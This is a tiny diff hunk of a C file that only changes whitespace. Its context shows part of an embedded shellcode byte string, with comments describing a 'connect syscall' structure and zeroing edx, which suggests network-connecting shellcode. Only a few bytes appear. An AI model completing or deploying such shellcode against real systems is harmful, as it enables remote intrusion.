@@ -69,7 +69,7 @@ int main(void)
                       "\x01\x01\x01\x01\x01\x01\x01\x01" // struct for connect syscall
                       ""
                       "\xD4\xBE\xB3\xBB" // 0 out edx
-
+                      
                       );
   
   return 0;
